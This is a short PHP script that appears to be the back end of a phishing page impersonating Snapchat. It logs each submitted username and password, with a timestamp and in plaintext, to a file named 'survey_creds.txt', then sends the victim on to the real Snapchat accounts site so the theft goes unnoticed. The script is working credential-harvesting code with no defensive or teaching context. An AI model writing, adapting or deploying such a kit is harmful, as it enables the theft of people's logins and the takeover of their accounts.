<?php
if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $log = "Username: $username | Password: $password | Time: " . date("Y-m-d H:i:s") . "\n";
    file_put_contents('survey_creds.txt', $log, FILE_APPEND);
    header("Location: https://accounts.snapchat.com");
    exit();
} else {
    header("Location: index.html");
    exit();
}
?>